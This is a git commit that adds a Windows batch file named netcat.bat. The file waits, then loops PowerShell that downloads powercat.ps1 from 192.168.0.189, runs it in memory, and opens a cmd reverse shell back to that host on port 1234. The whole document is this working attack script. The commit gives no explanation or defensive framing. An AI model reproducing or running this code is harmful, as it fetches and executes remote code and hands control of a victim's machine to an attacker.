9187bdf36512486db081a9a06a17cf3f607d40f8
wolfyy <60975463+wolfyy59@users.noreply.github.com>
2021-03-18 23:45:32 +0100

    Add files via upload

---
+++ netcat.bat
@@ -0,0 +1,6 @@
+@echo off 
+cls
+timeout 40
+:start
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.189/powercat.ps1');powercat -c 192.168.0.189 -p 1234 -e cmd"
+goto start
